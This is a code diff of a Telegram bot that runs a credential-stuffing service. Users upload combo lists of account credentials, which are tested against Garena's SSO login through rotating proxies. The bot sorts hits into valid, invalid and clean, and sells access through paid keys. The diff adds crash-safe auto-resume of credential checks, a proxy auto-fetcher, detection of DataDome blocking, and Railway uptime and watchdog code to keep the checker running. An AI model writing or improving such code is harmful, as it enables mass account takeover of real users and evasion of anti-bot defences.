+        saved_exp   = old_d.get("key_expires") or (_saved_users.get(key_id) or {}).get("key_expires", 0)
+        # Clear settings but keep key access
         _saved_users.pop(key_id, None)
         if uname:
             _saved_users.pop(uname.lstrip("@").lower(), None)
         _save_users_to_disk()
         _user_data.pop(chat_id, None)
         _bot_state.pop(chat_id, None)
+        # Restore key so user doesn't need to re-redeem
+        if saved_key and saved_exp and time.time() < saved_exp:
+            d = _udata(chat_id)
+            d["key"]         = saved_key
+            d["key_expires"] = saved_exp
+            # Note: intentionally NOT calling _save_profile here,
+            # so /start will go through level/filter picker again.
+            # _check_access will find the key in _udata.
         _tg_send(token, chat_id,
             "🗑 <b>Settings cleared!</b>\n\n"
             "Send /start to choose your level and hit type again.")
@@ -6083,6 +9526,7 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
             d["key"]          = saved.get("key")
             d["key_expires"]  = saved.get("key_expires", 0)
             d["combo_limit"]  = saved.get("combo_limit", COMBO_LINE_LIMIT)
+            d["key_tier"]     = saved.get("key_tier", "free")
             _bot_state[chat_id] = "AWAIT_FILE"
         else:
             _bot_state[chat_id] = "AWAIT_LEVEL"
@@ -6122,6 +9566,187 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
                 "Or send /start to reset settings.")
 
 
+# ── Auto-resume interrupted sessions on startup ───────────────
+def _auto_resume_sessions(token: str):
+    """Check for interrupted sessions from a crash/restart and resume them.
+    Uses persistent combo files from saved_combos/ directory.
+    
+    Key fix: The persistent combo file is trimmed as progress is made
+    (by _update_session_progress), so on resume it only contains remaining
+    lines. We read the file directly — no need to slice by progress offset
+    since the file is already trimmed to only unprocessed lines.
+    """
+    sessions = _load_active_sessions()
+    if not sessions:
+        return
+
+    logger.info(f"[BOT] 🔄 Found {len(sessions)} interrupted session(s) — attempting auto-resume...")
+
+    for key, sess in sessions.items():
+        chat_id    = sess.get("chat_id")
+        file_path  = sess.get("file_path", "")
+        persistent_path = sess.get("persistent_path", "")
+        file_name  = sess.get("file_name", "unknown.txt")
+        progress   = sess.get("progress", 0)
+        total      = sess.get("total_lines", 0)
+
+        if not chat_id:
+            continue
+
+        # Try persistent path first, then original path, then default saved_combos path
+        combo_path = None
+        for candidate in [persistent_path, file_path,
+                          os.path.join(SAVED_COMBOS_DIR, f"{chat_id}_{file_name}")]:
+            if candidate and os.path.exists(candidate):
+                combo_path = candidate
+                break
+
+        if not combo_path:
+            logger.warning(f"[BOT] Resume skip: file gone for chat {chat_id}")
+            # Only notify user if we haven't notified them recently (cooldown 5 min)
+            _last_notify = _resume_notify_ts.get(str(chat_id), 0)
+            if time.time() - _last_notify > 300:
+                _tg_send(token, chat_id,
+                    f"⚠️ <b>Bot restarted!</b>\n\n"
+                    f"Your previous check (<code>{file_name}</code>) could not resume — "
+                    f"the file was lost during restart.\n\n"
+                    f"📂 Please re-upload your combo file to continue.")
+                _resume_notify_ts[str(chat_id)] = time.time()
+            _remove_active_session(chat_id)
+            continue
+
+        # Read remaining lines from the combo file
+        # The persistent file is already trimmed by _update_session_progress,
+        # so it only contains unprocessed lines. Read ALL of them.
+        all_lines = []
+        for enc in ["utf-8", "latin-1", "cp1252", "iso-8859-1"]:
+            try:
+                with open(combo_path, "r", encoding=enc, errors="ignore") as fh:
+                    all_lines = [l.strip() for l in fh if l.strip() and ":" in l]
+                break
+            except Exception:
+                continue
+
+        if not all_lines:
+            _last_notify = _resume_notify_ts.get(str(chat_id), 0)
+            if time.time() - _last_notify > 300:
+                _tg_send(token, chat_id,
+                    f"⚠️ <b>Bot restarted!</b>\n\n"
+                    f"Could not resume <code>{file_name}</code> — file is empty or unreadable.\n\n"
+                    f"📂 Please re-upload your combo file.")
+                _resume_notify_ts[str(chat_id)] = time.time()
+            _remove_active_session(chat_id)
+            continue
+
+        # The file is already trimmed, so remaining_lines = all_lines
+        remaining_lines = all_lines
+        if not remaining_lines:
+            _last_notify = _resume_notify_ts.get(str(chat_id), 0)
+            if time.time() - _last_notify > 300:
+                _tg_send(token, chat_id,
+                    f"✅ <b>Bot restarted!</b>\n\n"
+                    f"Your previous check (<code>{file_name}</code>) was already complete.\n\n"
+                    f"📂 Send a new combo file to start again.")
+                _resume_notify_ts[str(chat_id)] = time.time()
+            _remove_active_session(chat_id)
+            continue
+
+        # Calculate original total for display (progress already done + remaining)
+        original_total = progress + len(remaining_lines)
+
+        # Restore user data
+        d = _udata(chat_id)
+        d["hits_id"]      = sess.get("hits_id", chat_id)
+        d["username"]     = sess.get("username", "")
+        d["level"]        = sess.get("level", [1])
+        d["clean_filter"] = sess.get("clean_filter", "both")
+        d["combo_limit"]  = sess.get("combo_limit", COMBO_LINE_LIMIT)
+
+        # Write remaining lines to a temp file for the checker
+        save_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "combo")
+        os.makedirs(save_dir, exist_ok=True)
+        resume_path = os.path.join(save_dir, f"resume_{chat_id}_{file_name}")
+        with open(resume_path, "w", encoding="utf-8") as fh:
+            fh.write("\n".join(remaining_lines) + "\n")
+
+        # Notify user (with 5-min cooldown to prevent spam on restart loops)
+        _last_notify = _resume_notify_ts.get(str(chat_id), 0)
+        if time.time() - _last_notify > 300:
+            _tg_send(token, chat_id,
+                f"🔄 <b>Auto-Resuming!</b>\n\n"
+                f"Bot restarted — resuming your check automatically.\n\n"
+                f"📄 <b>File:</b> <code>{file_name}</code>\n"
+                f"📊 <b>Already done:</b> {progress} | <b>Remaining:</b> {len(remaining_lines)} accounts\n\n"
+                f"<i>Resuming now... Send /stop to cancel.</i>")
+            _resume_notify_ts[str(chat_id)] = time.time()
+
+        # Start checker thread for remaining lines
+        hits_id = d["hits_id"]
+        user_telegram_config = (token, str(hits_id), d["level"], "", d["clean_filter"])
+
+        with _state_lock:
+            _bot_state[chat_id] = "RUNNING"
+
+        # Update session with new file path (also re-saves to persistent dir)
+        _save_active_session(chat_id, resume_path, file_name, remaining_lines, d, 0)
+
+        stop_evt = threading.Event()
+        with _stop_events_lock:
+            _stop_events[chat_id] = stop_evt
+
+        def _resume_run(cid=chat_id, rpath=resume_path, tg_cfg=user_telegram_config,
+                        se=stop_evt, fn=file_name, rem=len(remaining_lines)):
+            try:
+                label = f"resume:{cid}"
+                stats, result_folder = _run_checker_for_file(
+                    rpath, tg_cfg, chat_id=cid, label=label, stop_event=se
+                )
+                stopped = se.is_set()
+            except Exception as e:
+                stats = {}
+                result_folder = ""
+                stopped = False
+                logger.error(f"[BOT] Resume checker error: {e}", exc_info=True)
+            finally:
+                with _state_lock:
+                    _bot_state[cid] = "AWAIT_FILE"
+                with _stop_events_lock:
+                    _stop_events.pop(cid, None)
+                _remove_active_session(cid)
+
+                if stopped:
+                    _tg_send(token, cid,
+                        f"🛑 <b>Resumed checker stopped.</b>\n"
+                        f"📊 Partial results for <code>{fn}</code>")
+                else:
+                    valid = stats.get("valid", 0)
+                    invalid = stats.get("invalid", 0)
+                    clean_c = stats.get("clean", 0)
+                    _tg_send(token, cid,
+                        f"✅ <b>Resumed Check Complete!</b>\n\n"
+                        f"📄 <code>{fn}</code>\n"
+                        f"✅ Valid: <code>{valid}</code>  ❌ Invalid: <code>{invalid}</code>  "
+                        f"🧹 Clean: <code>{clean_c}</code>")
+
+                if result_folder and os.path.isdir(result_folder):
+                    _send_results_zip(token, cid, result_folder, fn)
+
+                # Cleanup temp file (not persistent copy)
+                try:
+                    if os.path.exists(rpath):
+                        os.remove(rpath)
+                except Exception:
+                    pass
+
+                gc.collect()
+                _tg_send(token, cid,
+                    f"📂 Send your next combo file to check again.\n"
+                    f"Or /start to reset your settings.")
+
+        threading.Thread(target=_resume_run, daemon=True).start()
+        logger.info(f"[BOT] 🔄 Resumed session for chat_id={chat_id}, {len(remaining_lines)} remaining")
+
+
 # ── long-poll loop (single daemon thread, handles all users) ───
 def start_bot_polling(token: str, _unused=None):
     offset = 0
@@ -6148,6 +9773,18 @@ def start_bot_polling(token: str, _unused=None):
     def _poll():
         nonlocal offset, poll_session, consecutive_errors
         logger.info("[BOT] 🤖 Polling started — waiting for users...")
+        _touch_liveness()  # polling started
+        # Sync user profiles and keys from KeyVault API (survives Railway redeploys)
+        try:
+            _load_saved_users(sync_api=True)
+            logger.info("[BOT] ✅ User profiles synced from API")
+        except Exception as e:
+            logger.warning(f"[BOT] API user sync skipped: {e}")
+        # Auto-resume any interrupted sessions from previous crash
+        try:
+            _auto_resume_sessions(token)
+        except Exception as e:
+            logger.error(f"[BOT] Auto-resume failed: {e}", exc_info=True)
         while not shutdown_event.is_set():
             try:
                 r = poll_session.get(
@@ -6156,6 +9793,7 @@ def start_bot_polling(token: str, _unused=None):
                     timeout=35
                 )
                 consecutive_errors = 0  # reset on success
+                _touch_liveness()  # polling is alive
 
                 if r.status_code == 429:
                     retry_after = int(r.headers.get("Retry-After", 10))
@@ -6206,20 +9844,164 @@ def start_bot_polling(token: str, _unused=None):
     threading.Thread(target=_poll, daemon=True).start()
 
 
+# ═══════════════════════════════════════════════════════════════════
+#  RAILWAY HEALTHCHECK SERVER — lightweight HTTP server for liveness
+#  Railway pings /health every 30s; if it fails 3 times → auto-restart
+# ═══════════════════════════════════════════════════════════════════
+_healthcheck_server = None  # reference to HTTPServer for cleanup
+
+def _start_healthcheck_server():
+    """Start a lightweight HTTP server for Railway healthchecks.
+    Responds 200 if bot is alive, 503 if the main loop appears stuck."""
+    from http.server import HTTPServer, BaseHTTPRequestHandler
+    import traceback
+
+    port = int(os.environ.get("PORT", 0))  # Railway sets PORT automatically
+
+    if not port:
+        logger.debug("[HEALTH] No PORT env var — healthcheck server disabled")
+        return
+
+    class HealthHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            if self.path == "/health":
+                # During graceful shutdown, always return 503
+                # This tells Railway "I'm going down on purpose, don't panic"
+                if _shutting_down:
+                    self.send_response(503)
+                    self.send_header("Content-Type", "application/json")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({
+                        "status": "shutting_down",
+                        "message": "Bot is shutting down gracefully",
+                    }).encode())
+                    logger.info("[HEALTH] 503 — shutting down")
+                    return
+                age = _get_liveness_age()
+                # If no liveness touch in 15 minutes → 503 (unhealthy)
+                # Was 5 min but that was too aggressive — caused Railway restart loops
+                # when the bot had brief network issues.
+                # 5-15 min range: return 200 but with "degraded" status (no restart)
+                if age > 900:
+                    self.send_response(503)
+                    self.send_header("Content-Type", "application/json")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({
+                        "status": "unhealthy",
+                        "reason": f"no activity for {int(age)}s",
+                    }).encode())
+                    logger.warning(f"[HEALTH] ❌ Healthcheck FAILED — no activity for {int(age)}s")
+                else:
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.end_headers()
+                    active = sum(1 for s in _bot_state.values() if s == "RUNNING")
+                    self.wfile.write(json.dumps({
+                        "status": "healthy",
+                        "active_checkers": active,
+                        "liveness_age_s": int(age),
+                        "proxies": geo_rotator.total if hasattr(geo_rotator, "total") else 0,
+                    }).encode())
+            else:
+                self.send_response(404)
+                self.end_headers()
+
+        def log_message(self, format, *args):
+            # Suppress default request logging to keep terminal clean
+            pass
+
+    try:
+        server = HTTPServer(("0.0.0.0", port), HealthHandler)
+        global _healthcheck_server
+        _healthcheck_server = server
+        threading.Thread(target=server.serve_forever, daemon=True, name="HealthcheckServer").start()
+        logger.info(f"[HEALTH] ✅ Healthcheck server listening on :{port}/health")
+    except Exception as e:
+        logger.warning(f"[HEALTH] Could not start healthcheck server: {e}")
+
+
+def _railway_redeploy():
+    """Trigger a clean shutdown so Railway can restart the container naturally.
+
+    IMPORTANT: We do NOT use os.execv anymore — it caused infinite restart loops
+    because it replaces the process in-place, bypassing Railway's health monitoring.
+    Instead, we set shutdown_event and let the process exit cleanly.
+    Railway detects the exit and starts a fresh container automatically.
+    """
+    global _shutting_down
+    _shutting_down = True
+
+    # Try Railway API redeploy first (only if token is configured)
+    token = os.environ.get("RAILWAY_TOKEN", "").strip()
+    service_id = os.environ.get("RAILWAY_SERVICE_ID", "").strip()
+    environment_id = os.environ.get("RAILWAY_ENVIRONMENT_ID", "").strip()
+
+    if token and service_id:
+        try:
+            logger.info("[RAILWAY] 🔄 Triggering redeploy via Railway API...")
+            # Use Railway's GraphQL API to trigger a redeploy
+            headers = {
+                "Authorization": f"Bearer {token}",
+                "Content-Type": "application/json",
+            }
+            query = """
+            mutation { deployTrigger(serviceId: "%s", environmentId: "%s") { id } }
+            """ % (service_id, environment_id)
+            resp = requests.post(
+                "https://backboard.railway.app/graphql/v2",
+                json={"query": query},
+                headers=headers,
+                timeout=10,
+            )
+            if resp.ok:
+                logger.info("[RAILWAY] ✅ Redeploy triggered successfully via API — exiting cleanly")
+                # Set shutdown event and return — main() will exit cleanly
+                shutdown_event.set()
+                with _stop_events_lock:
+                    for evt in _stop_events.values():
+                        evt.set()
+                return
+            else:
+                logger.warning(f"[RAILWAY] API redeploy failed ({resp.status_code}) — falling back to clean exit")
+        except Exception as e:
+            logger.warning(f"[RAILWAY] API redeploy error: {e} — falling back to clean exit")
+
+    # Fallback: clean exit (NOT os.execv — that caused restart loops!)
+    # Railway will detect the process exit and restart the container automatically.
+    logger.info("[RAILWAY] 🔄 Triggering clean shutdown — Railway will restart the container...")
+    shutdown_event.set()
+    with _stop_events_lock:
+        for evt in _stop_events.values():
+            evt.set()
+
+
+
 def main():
     global BOT_MODE
     print_banner()
 
     # ── Railway-safe signal handling (SIGTERM for graceful shutdown) ──
     def _graceful_shutdown(signum, frame):
+        global _shutting_down
+        if _shutting_down:
+            return  # Already shutting down — don't double-process
+        _shutting_down = True
         logger.warning(f"[MAIN] Received signal {signum} — shutting down gracefully...")
         shutdown_event.set()
         # Set all user stop events so running checkers stop
         with _stop_events_lock:
             for evt in _stop_events.values():
                 evt.set()
+        # Don't exit immediately — give Railway time to see the 503 healthcheck
+        # and give in-progress operations time to finish (up to 10 seconds).
+        # Railway sends SIGTERM, then waits ~30s before SIGKILL.
+        # We want to use that time wisely instead of vanishing instantly.
     signal.signal(signal.SIGTERM, _graceful_shutdown)
     signal.signal(signal.SIGINT,  _graceful_shutdown)
+
+    # ── Start Railway healthcheck server (responds to /health) ──
+    _start_healthcheck_server()
+    _touch_liveness()  # initial liveness touch
 
     proxy_file_names = [os.path.basename(p) for p in PROXY_FILES]
     logger.info(
@@ -6231,8 +10013,79 @@ def main():
     # ── Start Telegram bot ────────────────────────────────────
     BOT_MODE = True
     _cleanup_stale_files()
+    if not BOT_TOKEN:
+        logger.error("[MAIN] ❌ BOT_TOKEN is empty — cannot start Telegram polling!")
+        logger.error("[MAIN] Set BOT_TOKEN environment variable and the bot will auto-detect it.")
+        logger.error("[MAIN] Staying alive... waiting for config...")
+        # Don't crash — just wait. The _get_or_create_config() wait loop
+        # should have already handled this, but as an extra safety net:
+        while not shutdown_event.is_set():
+            time.sleep(30)
+            # Re-check env vars
+            new_token = os.environ.get("BOT_TOKEN", "").strip()
+            if new_token:
+                logger.info("[MAIN] ✅ BOT_TOKEN detected! Restarting...")
+                # Clean exit — Railway will restart the container with new env vars
+                global _shutting_down
+                _shutting_down = True
+                shutdown_event.set()
+                return
+        return
     start_bot_polling(BOT_TOKEN, None)
     _tg_set_commands(BOT_TOKEN)
+
+    # ── Notify owner that bot has started/restarted ──
+    # Anti-spam: skip notification if we restarted less than 5 minutes ago.
+    # This prevents notification spam when the bot is in a crash loop.
+    try:
+        _restart_count = _keysystem_api.load_state("restart_count") if _keysystem_api.enabled else {}
+        if not isinstance(_restart_count, dict):
+            _restart_count = {}
+        count = _restart_count.get("count", 0) + 1
+        last_restart_ts = _restart_count.get("last_restart", 0)
+        time_since_last = time.time() - last_restart_ts if last_restart_ts else 9999
+        _restart_count["count"] = count
+        _restart_count["last_restart"] = time.time()
+
+        # ── Restart loop detection ──
+        # Track recent restarts to detect crash loops
+        recent_restarts = _restart_count.get("recent", [])
+        now_ts = time.time()
+        # Keep only restarts from the last 10 minutes
+        recent_restarts = [t for t in recent_restarts if now_ts - t < 600]
+        recent_restarts.append(now_ts)
+        _restart_count["recent"] = recent_restarts[-20:]  # keep last 20
+        in_restart_loop = len(recent_restarts) >= 3
+
+        if _keysystem_api.enabled:
+            _keysystem_api.save_state("restart_count", _restart_count)
+
+        # ── Cooldown: skip notification if restarted <5 min ago (unless first start) ──
+        if time_since_last < 300 and count > 1:
+            logger.warning(f"[MAIN] Restarted {time_since_last:.0f}s after last restart — skipping notification (cooldown)")
+        else:
+            _now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            _total_users = len({v.get("hits_id") for v in _saved_users.values() if isinstance(v, dict) and "hits_id" in v})
+            _proxy_info = f"{geo_rotator.total} proxies" if hasattr(geo_rotator, "total") else "N/A"
+            loop_warn = ""
+            if in_restart_loop:
+                loop_warn = (
+                    f"\n\n⚠️ <b>RESTART LOOP DETECTED!</b> ({len(recent_restarts)} restarts in 10 min)\n"
+                    f"📋 <b>Check Railway logs for the root cause.</b>\n"
+                    f"🔇 <b>Further notifications suppressed until stable for 5 min.</b>"
+                )
+            _tg_send(BOT_TOKEN, OWNER_ID,
+                f"🤖 <b>Bot Restarted!</b>\n\n"
+                f"⏰ <b>Time:</b> {_now}\n"
+                f"🔄 <b>Restart #:</b> {count}\n"
+                f"👥 <b>Total Users:</b> {_total_users}\n"
+                f"🌐 <b>Proxies:</b> {_proxy_info}\n"
+                f"🚀 <b>Status:</b> Online & Ready\n\n"
+                f"👥 <b>Active Users:</b> Send /statuskey to see details"
+                f"{loop_warn}"
+            )
+    except Exception as e:
+        logger.warning(f"[MAIN] Failed to send restart notification: {e}")
 
     # ── Memory watchdog — 3-tier adaptive throttle ───────────────
     # Tier 1 (>80%): reduce to 3 threads (warn)
@@ -6326,16 +10179,143 @@ def main():
     threading.Thread(target=_memory_watchdog, daemon=True, name="MemWatchdog").start()
 
     # ── Railway keep-alive heartbeat ─────────────────────────
-    def _railway_heartbeat():
-        """Periodic heartbeat log to prevent Railway from thinking the process is idle."""
+    def _liveness_watchdog():
+        """Enhanced heartbeat + liveness watchdog.
+        Every 60s: log heartbeat and check liveness.
+        WARNING thresholds are generous to avoid false-positive restarts:
+        - 15 minutes: warning message (was 5 min — too aggressive)
+        - 30 minutes: self-healing restart (was 10 min — too aggressive)
+        The bot touches liveness every 30s via the main loop, and on every
+        successful Telegram poll + proxy fetch. Only trigger self-heal if
+        ALL of these are dead for a sustained period.
+        """
+        stuck_warned = False
+        restart_loop_count = 0  # track how many self-heals we've done
         while not shutdown_event.is_set():
-            time.sleep(300)  # every 5 minutes
+            time.sleep(60)  # check every minute
             try:
+                age = _get_liveness_age()
                 active = sum(1 for s in _bot_state.values() if s == "RUNNING")
-                logger.info(f"[HEARTBEAT] 💓 Bot alive | {active} active checker(s) | threads: {MAX_GLOBAL_THREADS}")
+
+                if age > 1800:  # 30 minutes — no activity at all (was 10 min)
+                    restart_loop_count += 1
+                    # If we've self-healed 3 times already, just log and wait
+                    # instead of restarting forever
+                    if restart_loop_count > 3:
+                        logger.error(f"[WATCHDOG] Self-healed {restart_loop_count} times — stopping restart loop. Bot will stay alive but idle.")
+                        try:
+                            _tg_send(BOT_TOKEN, OWNER_ID,
+                                f"🛑 <b>Self-Heal Stopped</b>\n\n"
+                                f"Bot has self-healed {restart_loop_count} times.\n"
+                                f"Stopping auto-restart to prevent loop.\n\n"
+                                f"📋 <b>Check Railway logs for root cause.</b>\n"
+                                f"🔄 <b>Restart the service manually when ready.</b>"
+                            )
+                        except Exception:
+                            pass
+                        # Stop the loop — don't restart anymore
+                        return
+
+                    logger.error(f"[WATCHDOG] 🚨 Bot appears DEAD — no activity for {int(age)}s! Triggering self-healing restart (attempt {restart_loop_count})...")
+                    try:
+                        _tg_send(BOT_TOKEN, OWNER_ID,
+                            f"🚨 <b>Bot Self-Heal Triggered</b>\n\n"
+                            f"No activity detected for <b>{int(age/60)} minutes</b>.\n"
+                            f"Bot is restarting itself automatically (attempt {restart_loop_count}).\n\n"
+                            f"<i>You don't need to do anything.</i>"
+                        )
+                        time.sleep(3)  # give message time to send
+                    except Exception:
+                        pass
+                    # Self-heal: trigger clean shutdown (NOT os.execv — that caused loops)
+                    # Railway will restart the container automatically after the process exits.
+                    if _is_railway():
+                        _railway_redeploy()
+                    else:
+                        # Non-Railway: clean exit, the crash guard in __main__ will handle retry
+                        global _shutting_down
+                        _shutting_down = True
+                        shutdown_event.set()
+                        with _stop_events_lock:
+                            for evt in _stop_events.values():
+                                evt.set()
+
+                elif age > 900:  # 15 minutes — concerning (was 5 min)
+                    if not stuck_warned:
+                        logger.warning(f"[WATCHDOG] ⚠️ Bot may be stuck — no activity for {int(age)}s")
+                        stuck_warned = True
+                        try:
+                            _tg_send(BOT_TOKEN, OWNER_ID,
+                                f"⚠️ <b>Bot May Be Stuck</b>\n\n"
+                                f"No activity for <b>{int(age/60)} minutes</b>.\n"
+                                f"Will auto-restart in 15 min if no recovery."
+                            )
+                        except Exception:
+                            pass
+                else:
+                    stuck_warned = False  # recovered
+                    restart_loop_count = 0  # reset on recovery
+                    logger.info(f"[HEARTBEAT] 💓 Bot alive | {active} active | liveness: {int(age)}s ago | threads: {MAX_GLOBAL_THREADS}")
             except Exception:
                 pass
-    threading.Thread(target=_railway_heartbeat, daemon=True, name="RailwayHeartbeat").start()
+    threading.Thread(target=_liveness_watchdog, daemon=True, name="LivenessWatchdog").start()
+
+    # ── Raw proxy auto-fetch (every 30 seconds from external sources) ──
+    threading.Thread(target=_fetch_raw_proxies, daemon=True, name="RawProxyFetcher").start()
+
+    # ── Startup diagnostic: verify auto-fetch thread is alive ──
+    def _verify_proxy_fetch():
+        """Wait 35s then verify the proxy fetcher actually ran and loaded proxies."""
+        time.sleep(35)  # Wait for first fetch cycle (30s interval + buffer)
+        log = logging.getLogger(__name__)
+        pool_size = geo_rotator.total
+        if pool_size > 0:
+            log.info(f"[STARTUP] ✅ Proxy auto-fetch working — pool: {pool_size} proxies")
+        else:
+            log.error(f"[STARTUP] ❌ Proxy pool still 0 after 35s — auto-fetch may be broken!")
+            log.error(f"[STARTUP] Check if proxy/ folder exists and sources are reachable")
+            # Try to list proxy folder contents
+            try:
+                if os.path.exists(PROXY_FOLDER):
+                    files = os.listdir(PROXY_FOLDER)
+                    log.error(f"[STARTUP] proxy/ folder contents: {files}")
+                else:
+                    log.error(f"[STARTUP] proxy/ folder does NOT exist!")
+            except Exception as e:
+                log.error(f"[STARTUP] Cannot list proxy folder: {e}")
+    threading.Thread(target=_verify_proxy_fetch, daemon=True, name="ProxyFetchVerify").start()
+
+    # ── Startup proxy connectivity diagnostic ──
+    def _startup_proxy_check():
+        """Quick diagnostic: test if Garena SSO is reachable and warn if blocked."""
+        time.sleep(3)  # Wait for proxy fetcher to run first
+        log = logging.getLogger(__name__)
+        pool_size = geo_rotator.total
+        try:
+            # Test direct connection
+            resp = requests.get(
+                "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
+                timeout=8, allow_redirects=False
+            )
+            if resp.status_code == 403:
+                log.warning(f"[STARTUP] 🛡️ Direct IP is DataDome-blocked (403) — proxies REQUIRED")
+                if pool_size == 0:
+                    log.error(f"[STARTUP] ❌ NO PROXIES LOADED + IP BLOCKED = all accounts will fail!")
+                    log.error(f"[STARTUP] 💡 Add working proxies to proxy/ folder or wait for auto-fetch")
+                else:
+                    log.info(f"[STARTUP] ✅ Proxy pool has {pool_size} proxies — should work")
+            elif resp.status_code == 200:
+                log.info(f"[STARTUP] ✅ Direct connection works (no DataDome block)")
+                if pool_size > 0:
+                    log.info(f"[STARTUP] 📦 Proxy pool: {pool_size} proxies available")
+            else:
+                log.info(f"[STARTUP] ℹ️ Garena SSO returned HTTP {resp.status_code}")
+        except Exception as e:
+            log.warning(f"[STARTUP] ⚠️ Cannot reach Garena SSO directly: {e}")
+            if pool_size == 0:
+                log.error(f"[STARTUP] ❌ NO PROXIES + no direct access = checker will fail!")
+
+    threading.Thread(target=_startup_proxy_check, daemon=True, name="ProxyDiagnostic").start()
 
     bot_console.print(
         "[bold green]🤖 Bot is running![/bold green]\n"
@@ -6344,30 +10324,100 @@ def main():
     bot_console.print("[dim]Press Ctrl+C to stop.[/dim]\n")
 
     # Keep the main thread alive — catch ALL exceptions to prevent crash-exit
+    # Also touches liveness every 30s so the watchdog knows we're alive.
+    _main_loop_tick = 0
     while not shutdown_event.is_set():
         try:
             time.sleep(1)
+            _main_loop_tick += 1
+            if _main_loop_tick >= 30:  # touch liveness every 30s
+                _touch_liveness()
+                _main_loop_tick = 0
         except KeyboardInterrupt:
             break
         except Exception as e:
             logger.error(f"[MAIN] Unexpected error in main loop: {e}")
             time.sleep(2)   # brief pause then continue — don't exit
 
+    # ── Grace period: wait for in-progress operations to finish ──
+    # Railway gives us ~30s between SIGTERM and SIGKILL.
+    # Use up to 10s of that for cleanup before exiting.
+    if _shutting_down:
+        logger.info("[MAIN] Shutdown requested — waiting up to 10s for in-progress operations...")
+        for _ in range(10):
+            # Check if any checkers are still running
+            active = sum(1 for s in _bot_state.values() if s == "RUNNING")
+            if active == 0:
+                break
+            logger.info(f"[MAIN] Waiting for {active} active checker(s) to stop...")
+            time.sleep(1)
+        logger.info("[MAIN] Grace period complete — exiting cleanly.")
+
 
 if __name__ == "__main__":
-    while True:   # auto-restart on unexpected crash
+    # _shutting_down is a module-level variable — no `global` needed at module level
+    # Top-level crash guard with exponential backoff + self-healing on Railway.
+    # Instead of "giving up", triggers Railway redeploy or process restart.
+    # KEY FIX: SystemExit is NOT treated as a crash — it means the bot shut down
+    # intentionally (SIGTERM, etc.) and should NOT be retried.
+    MAX_CRASH_RETRIES = 5         # internal retry limit
+    crash_count = 0
+    while crash_count < MAX_CRASH_RETRIES:
         try:
+            _shutting_down = False  # reset for new attempt
             shutdown_event.clear()   # reset shutdown flag for restart
             gc.collect()  # clean up before each run
             main()
-            break   # clean exit (shutdown_event set) — don't restart
+            crash_count = 0  # reset on clean exit (shutdown_event set)
+            break
+        except SystemExit:
+            # SystemExit = intentional shutdown (SIGTERM handled gracefully, etc.)
+            # Do NOT retry — this is NOT a crash.
+            logger = logging.getLogger(__name__)
+            logger.info("[MAIN] Bot exited via SystemExit — intentional shutdown, not a crash.")
+            break
         except KeyboardInterrupt:
             bot_console.print(f"\n[yellow]⚠️  Bot stopped by user[/yellow]")
             break
         except MemoryError:
             gc.collect()
-            bot_console.print(f"[red]✘ Memory error — forcing GC and restarting in 3s...[/red]")
-            time.sleep(3)
+            crash_count += 1
+            bot_console.print(f"[red]✘ Memory error (crash {crash_count}/{MAX_CRASH_RETRIES}) — forcing GC and restarting in 10s...[/red]")
+            time.sleep(10)
         except Exception as e:
-            bot_console.print(f"[red]✘ Unexpected error: {e} — restarting in 5s...[/red]")
-            time.sleep(5)   # wait then restart automatically
+            crash_count += 1
+            logger = logging.getLogger(__name__)
+            logger.error(f"[MAIN] ✘ Unexpected error (crash {crash_count}/{MAX_CRASH_RETRIES}): {e}", exc_info=True)
+            # Exponential backoff: 30s, 60s, 120s, 240s, 480s
+            backoff = min(30 * (2 ** (crash_count - 1)), 480)
+            bot_console.print(f"[red]✘ Restarting in {backoff}s... (attempt {crash_count}/{MAX_CRASH_RETRIES})[/red]")
+            if _is_railway():
+                logger.error(f"[MAIN] Running on Railway — retry {crash_count}/{MAX_CRASH_RETRIES} in {backoff}s...")
+                time.sleep(backoff)
+            else:
+                time.sleep(backoff)
+    else:
+        # ── All internal retries exhausted — SELF-HEAL instead of giving up ──
+        logger = logging.getLogger(__name__)
+        logger.error(f"[MAIN] ✘ Bot crashed {MAX_CRASH_RETRIES} times — triggering self-healing restart!")
+        bot_console.print(f"[bold red]✘ Crashed {MAX_CRASH_RETRIES} times — self-healing restart![/bold red]")
+
+        if _is_railway():
+            # On Railway: trigger redeploy via API (or fall back to execv)
+            # This ensures Railway knows about the restart and tracks it properly.
+            try:
+                _tg_send(BOT_TOKEN, OWNER_ID,
+                    f"🚨 <b>Self-Healing Redeploy</b>\n\n"
+                    f"Bot crashed {MAX_CRASH_RETRIES} times internally.\n"
+                    f"Triggering Railway redeploy now.\n\n"
+                    f"<i>Bot will be back online automatically.</i>"
+                )
+                time.sleep(3)
+            except Exception:
+                pass
+            _railway_redeploy()
+        else:
+            # Not on Railway: let the process exit cleanly.
+            # If running in a process manager (systemd, etc.), it will restart automatically.
+            # os.execv was removed — it caused infinite restart loops by bypassing cleanup.
+            logger.info("[MAIN] All retries exhausted — exiting. Process manager will restart if configured.")
